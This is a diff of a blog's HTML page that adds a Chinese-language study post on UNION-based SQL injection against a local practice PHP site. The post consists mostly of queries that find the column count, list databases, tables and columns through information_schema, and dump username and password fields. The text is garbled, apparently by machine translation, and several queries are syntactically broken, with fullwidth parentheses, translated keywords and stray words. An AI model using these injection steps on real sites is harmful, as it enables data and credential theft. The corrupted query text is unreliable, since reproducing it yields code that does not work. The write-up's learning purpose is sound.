@@ -62,6 +62,36 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/08/14/sql/" class="article-date">
+  <time datetime="2019-08-14T05:08:34.164Z" itemprop="datePublished">2019-08-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p>SQL注入查询</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">摘要：先在数据库中使用UNION写SQL查出数据库版本，库，表，列等信息，再在index.php中操作一遍。</span><br><span class="line"></span><br><span class="line">一，首先确定列数</span><br><span class="line">- 根据是否报错确定列数</span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">' admin'</span>ORDER BY 4; </span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>ORDER BY 5; </span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>ORDER BY 6;</span><br><span class="line">OUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">由输出结果可知，共有五列。</span><br><span class="line"></span><br><span class="line">二，读取数据</span><br><span class="line">确定库名</span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>UNION SELECT version（），（SELECT group_concat（schema_name）FROM information_schema.schemata），3,4,5;</span><br><span class="line">OUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">确定表名</span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>UNION SELECT 1，（select group_concat（table_name）FROM information_schema.tables WHERE table_schema =<span class="string">'mynews'</span>），3,4,5限制1,1;</span><br><span class="line">OUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>UNION SELECT 1，（select group_concat（table_name）FROM information_schema.tables WHERE table_schema =<span class="string">'test'</span>），3,4,5限制1,1;</span><br><span class="line">OUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">对库进行一一查询，找到目标库</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>UNION SELECT 1，（SELECT group_concat（column_name）FROM information_schema.columns WHERE table_name =<span class="string">'content'</span>），3,4,5限制1,1;</span><br><span class="line">OUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>UNION SELECT 1，（SELECT group_concat（column_name）FROM information_schema.columns WHERE table_name =<span class="string">'users'</span>），3,4,5限制1,1;</span><br><span class="line">可以看到有重复的字段，原因是昨天练习数据库导入时，同一对.sql文件导入不同的库，即库里不同存关系着名为users状语从句：content的表。加上限定条件即可。</span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>UNION SELECT 1,2,3,4，group_concat（COLUMN_NAME）FROM information_schema.COLUMNS WHERE TABLE_NAME =<span class="string">'users'</span>AND TABLE_SCHEMA =<span class="string">'test'</span>;</span><br><span class="line">OUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM users WHERE username =<span class="string">'admin'</span>UNION SELECT 1，（SELECT group_concat（username，passwd）FROM`<span class="built_in">test</span>` .content`），3,4,5;</span><br><span class="line">OUT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以利用查到的库名表名字段名，查看对应的信息。</span><br><span class="line"></span><br><span class="line">三，网页上练习</span><br><span class="line">环境</span><br><span class="line">把首先index.php拷贝产品到工程文件中，用phpstorm打开文件，在Terminal输入侧</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">php -S 127.0.0.1:9000</span><br><span class="line">在浏览器中打开网页http://127.0.0.1:9000/index.php</span><br><span class="line"></span><br><span class="line">首页如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.前期工作</span><br><span class="line">index.php显示程序如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可知，显示的读取数据的前三个。</span><br><span class="line"></span><br><span class="line">在提交按钮输入</span><br><span class="line"></span><br><span class="line">SELECT * FROM`mysql``user` WHERE`user` =<span class="string">'root'</span>order by 49;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM`mysql``user` WHERE`user` =<span class="string">'root'</span>的顺序为50;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可知字段数为49。</span><br><span class="line"></span><br><span class="line">3.开始查询</span><br><span class="line">查询库名</span><br><span class="line">SELECT * FROM`mysql``user` WHERE`user` =<span class="string">'root'</span>UNION SELECT version（），user（），（SELECT group_concat（schema_name）FROM information_schema.schemata），4,5,6,7,8， 9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33， 34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">SELECT * FROM`mysql` .user` WHERE`user` =<span class="string">'root'</span>UNION SELECT 1,2，（SELECT group_concat（table_name）FROM information_schema.tables WHERE table_schema =<span class="string">'test'</span>），4,5,6,7， 8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32， 33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">SELECT * FROM`mysql` .user` WHERE`user` =<span class="string">'root'</span>UNION SELECT 1,2，（SELECT group_concat（column_name）FROM information_schema.columns WHERE table_name =<span class="string">'content'</span>），4,5,6,7， 8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32， 33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以看出来有重复的字段名，的英文这两个因为不同库里均有content状语从句：users表。加上库名的限制就正常了。</span><br><span class="line"></span><br><span class="line">SELECT * FROM`mysql` .user` WHERE`user` =<span class="string">'root'</span>UNION SELECT 1,2，（SELECT group_concat（column_name）FROM information_schema.columns WHERE table_name =<span class="string">'content'</span>AND table_schema =<span class="string">'test'</span>），4， 5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29， 30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM`mysql` .user` WHERE`user` =<span class="string">'root'</span>UNION SELECT 1,2，（SELECT group_concat（column_name）FROM information_schema.columns WHERE table_name =<span class="string">'user'</span>），4,5,6,7， 8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32， 33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br><span class="line">查询数据</span><br><span class="line">SELECT * FROM`mysql``user` WHERE`user` =<span class="string">'root'</span>UNION SELECT 1,2，（SELECT concat_ws（<span class="string">'〜'</span>，author，title）FROM`<span class="built_in">test</span>` .content` LIMIT 0,1）， 4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28， 29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SELECT * FROM`mysql``user` WHERE`user` =<span class="string">'root'</span>UNION SELECT 1,2，（SELECT group_concat（author，<span class="string">'〜'</span>，title）FROM`<span class="built_in">test</span>` .content`），4,5， 6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30， 31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">也。同理柯林斯查出users数据</span><br><span class="line"></span><br><span class="line">SELECT * FROM`mysql``user` WHERE`user` =<span class="string">'root'</span>UNION SELECT 1,2，（SELECT group_concat（username，<span class="string">'〜'</span>，passwd）FROM`<span class="built_in">test</span>` .users`），4,5， 6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30， 31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 LIMIT 1,1</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/08/14/sql/" data-id="cjzatpakz0001l4ukwqouhdef" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-header" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/08/13/header/" class="article-date">
@@ -93,7 +123,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/13/header/" data-id="cjza0h6ob0002ooukdipfym27" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/13/header/" data-id="cjzatpaly0006l4uk0kjv7som" class="article-share-link">Share</a>
       
       
     </footer>
@@ -131,7 +161,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/12/jiaoxing/" data-id="cjza0h6o70001oouk6x9st1yi" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/12/jiaoxing/" data-id="cjzatpal10002l4ukwlplebpb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -160,7 +190,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/php/" data-id="cjza0h6qd0006oouke5pydk2z" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/11/php/" data-id="cjzatpam40007l4ukd18y5qz0" class="article-share-link">Share</a>
       
       
     </footer>
@@ -189,7 +219,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/11/primenum/" data-id="cjza0h6od0003ooukvpwkub4m" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/11/primenum/" data-id="cjzatpalo0004l4uk0yd4fl99" class="article-share-link">Share</a>
       
       
     </footer>
@@ -284,7 +314,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/09/centOS/" data-id="cjza0h6p30004ooukshi6qxzk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/09/centOS/" data-id="cjzatpalc0003l4ukfpkryfd2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -329,7 +359,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/08/07/LINUX/" data-id="cjza0h6pr0005oouklp301chz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/08/07/LINUX/" data-id="cjzatpalp0005l4uk7jqobamp" class="article-share-link">Share</a>
       
       
     </footer>
@@ -378,7 +408,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/24/hello-world/" data-id="cjza0h6ns0000ooukmacx5de5" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/07/24/hello-world/" data-id="cjzatpakr0000l4uk03elp72s" class="article-share-link">Share</a>
       
       
     </footer>
@@ -419,6 +449,10 @@
       <ul>
         
           <li>
+            <a href="/2019/08/14/sql/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2019/08/13/header/">新闻注册页面</a>
           </li>
         
@@ -432,10 +466,6 @@
         
           <li>
             <a href="/2019/08/11/primenum/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2019/08/09/centOS/">centOS 基础命令及设置</a>
           </li>
         
       </ul>
